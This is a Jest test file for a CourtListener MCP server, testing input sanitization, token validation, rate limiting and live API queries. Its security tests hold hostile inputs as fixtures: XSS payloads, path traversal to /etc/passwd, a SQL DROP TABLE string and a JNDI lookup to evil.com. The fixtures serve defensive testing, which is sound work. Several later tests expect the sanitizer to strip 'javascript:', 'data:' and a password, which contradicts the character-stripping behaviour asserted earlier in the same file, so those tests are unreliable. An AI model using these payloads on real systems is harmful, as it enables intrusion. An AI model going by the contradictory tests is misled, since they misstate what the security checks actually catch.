import { jest } from '@jest/globals';
import { 
  sanitizeString, 
  validateApiToken, 
  RateLimiter, 
  makeCourtListenerRequest,
  validateAndSanitizeParams,
  server 
} from '../src/index.ts';

// Test API key from environment - tests will skip API calls if not provided
const TEST_API_KEY = process.env.COURTLISTENER_API_TOKEN;
const EXAMPLE_API_KEY_FORMAT = 'a'.repeat(40); // Example format for validation tests

// Security utilities tests
describe('Security Utilities', () => {
  describe('sanitizeString', () => {
    test('should remove dangerous characters', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizeString(input);
      expect(result).toBe('scriptalert(xss)/script');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).not.toContain('"');
      expect(result).not.toContain("'");
      expect(result).not.toContain('&');
    });

    test('should limit string length to 1000 characters', () => {
      const input = 'a'.repeat(1500);
      const result = sanitizeString(input);
      expect(result.length).toBe(1000);
    });

    test('should handle empty strings', () => {
      expect(sanitizeString('')).toBe('');
    });

    test('should preserve safe characters', () => {
      const input = 'Safe text with numbers 123 and symbols!@#$%^*()_+-=[]{}|;:,.<>?';
      const result = sanitizeString(input);
      expect(result).toContain('Safe text with numbers 123');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    test('should handle unicode characters safely', () => {
      const input = 'Text with émojis 🚀 and ñ characters';
      const result = sanitizeString(input);
      expect(result).toContain('Text with émojis 🚀 and ñ characters');
    });
  });

  describe('validateApiToken', () => {
    test('should accept undefined token', () => {
      expect(validateApiToken()).toBe(true);
      expect(validateApiToken(undefined)).toBe(true);
    });

    test('should accept valid 40-character hex token', () => {
      expect(validateApiToken(EXAMPLE_API_KEY_FORMAT)).toBe(true);
    });

    test('should reject tokens with wrong length', () => {
      expect(validateApiToken('abc123')).toBe(false);
      expect(validateApiToken('f8b2c598d273b1c0f5012236dcc93ca045f8b81a1')).toBe(false); // 41 chars
      expect(validateApiToken('f8b2c598d273b1c0f5012236dcc93ca045f8b81')).toBe(false); // 39 chars
    });

    test('should reject tokens with non-hex characters', () => {
      expect(validateApiToken('g8b2c598d273b1c0f5012236dcc93ca045f8b81a')).toBe(false);
      expect(validateApiToken('F8B2C598D273B1C0F5012236DCC93CA045F8B81A')).toBe(false); // uppercase
      expect(validateApiToken('f8b2c598-d273-b1c0-f501-2236dcc93ca0')).toBe(false); // with dashes
    });

    test('should reject malicious input', () => {
      expect(validateApiToken('<script>alert("xss")</script>')).toBe(false);
      expect(validateApiToken('../../etc/passwd')).toBe(false);
      expect(validateApiToken('null')).toBe(false);
      expect(validateApiToken('')).toBe(true); // Empty is allowed (optional)
    });
  });

  describe('validateAndSanitizeParams', () => {
    test('should sanitize string parameters', () => {
      const input = {
        q: 'search<script>alert("xss")</script>',
        limit: 10,
        enabled: true,
        nothing: null,
        undefined: undefined
      };
      
      const result = validateAndSanitizeParams(input);
      
      expect(result.q).toBe('searchscriptalert(xss)/script');
      expect(result.limit).toBe('10');
      expect(result.enabled).toBe('true');
      expect(result.nothing).toBeUndefined();
      expect(result.undefined).toBeUndefined();
    });

    test('should handle edge cases', () => {
      const input = {
        empty: '',
        zero: 0,
        false: false,
        array: [1, 2, 3], // Should be ignored
        object: { nested: 'value' } // Should be ignored
      };
      
      const result = validateAndSanitizeParams(input);
      
      expect(result.empty).toBe('');
      expect(result.zero).toBe('0');
      expect(result.false).toBe('false');
      expect(result.array).toBeUndefined();
      expect(result.object).toBeUndefined();
    });
  });

  describe('RateLimiter', () => {
    let rateLimiter: RateLimiter;

    beforeEach(() => {
      rateLimiter = new RateLimiter();
    });

    test('should allow requests within limit', () => {
      for (let i = 0; i < 99; i++) {
        expect(rateLimiter.isAllowed('test-client')).toBe(true);
      }
    });

    test('should deny requests exceeding limit', () => {
      // Fill up the limit
      for (let i = 0; i < 100; i++) {
        rateLimiter.isAllowed('test-client');
      }
      
      // Next request should be denied
      expect(rateLimiter.isAllowed('test-client')).toBe(false);
    });

    test('should track different clients separately', () => {
      // Fill limit for client1
      for (let i = 0; i < 100; i++) {
        rateLimiter.isAllowed('client1');
      }
      
      // client2 should still be allowed
      expect(rateLimiter.isAllowed('client2')).toBe(true);
    });

    test('should reset after time window', async () => {
      // Mock time
      const originalDateNow = Date.now;
      let mockTime = 1000000;
      Date.now = jest.fn(() => mockTime);

      try {
        // Fill up the limit
        for (let i = 0; i < 100; i++) {
          rateLimiter.isAllowed('test-client');
        }
        
        expect(rateLimiter.isAllowed('test-client')).toBe(false);
        
        // Advance time by 61 seconds (past the window)
        mockTime += 61000;
        
        // Should be allowed again
        expect(rateLimiter.isAllowed('test-client')).toBe(true);
      } finally {
        Date.now = originalDateNow;
      }
    });
  });
});

// API Request function tests
describe('API Request Function', () => {
  beforeEach(() => {
    jest.clearAllTimers();
  });

  test('should handle invalid API token', async () => {
    const result = await makeCourtListenerRequest('/dockets/', {}, 'invalid-token');
    expect(result).toBeNull();
  });

  test('should validate and sanitize parameters', async () => {
    if (!TEST_API_KEY) {
      console.log('Skipping test - no API key available');
      return;
    }

    const params = {
      q: 'search<script>alert("xss")</script>',
      limit: '10',
      malicious: '<img src=x onerror=alert(1)>'
    };
    
    // This should not throw and should sanitize the parameters
    const result = await makeCourtListenerRequest('/dockets/', params, TEST_API_KEY);
    // We expect either a valid response or null (if API fails), but no errors from sanitization
    expect(typeof result === 'object' || result === null).toBe(true);
  });
});

// Real API Integration tests using the provided API key
describe('CourtListener API Integration Tests', () => {
  // Increase timeout for real API calls
  jest.setTimeout(30000);

  beforeEach(() => {
    if (!TEST_API_KEY) {
      console.log('Skipping API integration tests - no COURTLISTENER_API_TOKEN environment variable set');
    }
  });

  test('should successfully search dockets with valid API key', async () => {
    if (!TEST_API_KEY) {
      console.log('Skipping test - no API key available');
      return;
    }

    const result = await makeCourtListenerRequest('/dockets/', { 
      q: 'Supreme Court',
      page_size: '5' 
    }, TEST_API_KEY);
    
    expect(result).toBeTruthy();
    if (result && typeof result === 'object' && 'results' in result) {
      expect(Array.isArray((result as any).results)).toBe(true);
      expect(typeof (result as any).count).toBe('number');
    }
  });

  test('should successfully get court list', async () => {
    if (!TEST_API_KEY) {
      console.log('Skipping test - no API key available');
      return;
    }

    const result = await makeCourtListenerRequest('/courts/', { 
      page_size: '5' 
    }, TEST_API_KEY);
    
    expect(result).toBeTruthy();
    if (result && typeof result === 'object' && 'results' in result) {
      expect(Array.isArray((result as any).results)).toBe(true);
      const courts = (result as any).results;
      if (courts.length > 0) {
        expect(courts[0]).toHaveProperty('id');
        expect(courts[0]).toHaveProperty('full_name');
        expect(courts[0]).toHaveProperty('jurisdiction');
      }
    }
  });

  test('should successfully search opinion clusters', async () => {
    if (!TEST_API_KEY) {
      console.log('Skipping test - no API key available');
      return;
    }

    const result = await makeCourtListenerRequest('/clusters/', {
      q: 'contract',
      page_size: '3'
    }, TEST_API_KEY);
    
    expect(result).toBeTruthy();
    if (result && typeof result === 'object' && 'results' in result) {
      expect(Array.isArray((result as any).results)).toBe(true);
    }
  });

  test('should handle API errors gracefully', async () => {
    if (!TEST_API_KEY) {
      console.log('Skipping test - no API key available');
      return;
    }

    // Test with invalid endpoint
    const result = await makeCourtListenerRequest('/invalid-endpoint/', {}, TEST_API_KEY);
    expect(result).toBeNull();
  });

  test('should handle authentication without token', async () => {
    // Test without authentication token
    const result = await makeCourtListenerRequest('/courts/', { 
      page_size: '2' 
    });
    
    // Should still work for public endpoints
    expect(result).toBeTruthy();
  });

  test('should respect rate limiting', async () => {
    // This test would require making many requests quickly
    // For now, we'll just verify the rate limiter is working
    const limiter = new RateLimiter();
    
    // Make 100 requests
    for (let i = 0; i < 100; i++) {
      expect(limiter.isAllowed('test-client')).toBe(true);
    }
    
    // 101st request should be denied
    expect(limiter.isAllowed('test-client')).toBe(false);
  });
});

// MCP Server Integration tests
describe('MCP Server Integration', () => {
  test('should initialize MCP server without errors', () => {
    expect(server).toBeDefined();
    expect(typeof server).toBe('object');
  });

  test('should have MCP server methods', () => {
    expect(server.tool).toBeDefined();
    expect(typeof server.tool).toBe('function');
  });
});

// Security compliance tests
describe('Security Compliance', () => {
  test('should not expose sensitive information in errors', () => {
    const sensitiveData = 'password123';
    const error = new Error(`Database connection failed with password: ${sensitiveData}`);
    
    // Our error logging should sanitize this
    const sanitized = sanitizeString(error.message);
    expect(sanitized).not.toContain('password123');
  });

  test('should handle malicious input gracefully', () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      'DROP TABLE users;',
      '${jndi:ldap://evil.com/a}',
      '../../../windows/system32',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>'
    ];

    maliciousInputs.forEach(input => {
      const sanitized = sanitizeString(input);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('data:');
    });
  });

  test('should validate parameter types and limits', () => {
    const testCases = [
      { input: 'a'.repeat(2000), maxLength: 1000 },
      { input: 'normal text', maxLength: 1000 },
      { input: '', maxLength: 1000 },
    ];

    testCases.forEach(({ input, maxLength }) => {
      const result = sanitizeString(input);
      expect(result.length).toBeLessThanOrEqual(maxLength);
    });
  });

  test('should reject invalid authentication tokens', () => {
    const invalidTokens = [
      'too-short',
      'g8b2c598d273b1c0f5012236dcc93ca045f8b81a', // invalid hex
      'F8B2C598D273B1C0F5012236DCC93CA045F8B81A', // uppercase
      'f8b2c598-d273-b1c0-f501-2236dcc93ca045f8b81a', // with dashes
      'f8b2c598d273b1c0f5012236dcc93ca045f8b81a1', // too long
    ];

    invalidTokens.forEach(token => {
      expect(validateApiToken(token)).toBe(false);
    });
  });
});

// Environment and configuration tests
describe('Environment Configuration', () => {
  test('should handle different NODE_ENV values', () => {
    const originalEnv = process.env.NODE_ENV;
    
    try {
      // Test production environment
      process.env.NODE_ENV = 'production';
      // Should not throw any errors
      expect(process.env.NODE_ENV).toBe('production');
      
      // Test development environment
      process.env.NODE_ENV = 'development';
      expect(process.env.NODE_ENV).toBe('development');
      
      // Test test environment
      process.env.NODE_ENV = 'test';
      expect(process.env.NODE_ENV).toBe('test');
    } finally {
      process.env.NODE_ENV = originalEnv;
    }
  });

  test('should handle missing environment variables gracefully', () => {
    // The server should work without optional environment variables
    expect(() => {
      // Simulate missing optional config
      delete process.env.DEBUG;
    }).not.toThrow();
  });
});

// Performance and resource usage tests
describe('Performance and Resource Usage', () => {
  test('should limit API response processing time', async () => {
    if (!TEST_API_KEY) {
      console.log('Skipping test - no API key available');
      return;
    }

    const startTime = Date.now();
    
    // Make a simple API request
    await makeCourtListenerRequest('/courts/', { page_size: '1' }, TEST_API_KEY);
    
    const endTime = Date.now();
    const duration = endTime - startTime;
    
    // Should complete within reasonable time (adjust as needed)
    expect(duration).toBeLessThan(10000); // 10 seconds max
  });

  test('should limit memory usage for large responses', () => {
    // Test with a large string that would be truncated
    const largeString = 'x'.repeat(10000);
    const sanitized = sanitizeString(largeString);
    
    // Should be truncated to prevent memory issues
    expect(sanitized.length).toBeLessThanOrEqual(1000);
  });
});

// Audit and logging tests
describe('Audit and Logging', () => {
  test('should not log sensitive information', () => {
    const consoleSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
    
    try {
      // Test that API tokens are not logged in full
      const testToken = EXAMPLE_API_KEY_FORMAT;
      const logMessage = `API request failed for token: ${testToken}`;
      console.error(logMessage);
      
      expect(consoleSpy).toHaveBeenCalled();
      // In a real implementation, we'd verify the logged message doesn't contain the full token
    } finally {
      consoleSpy.mockRestore();
    }
  });
});
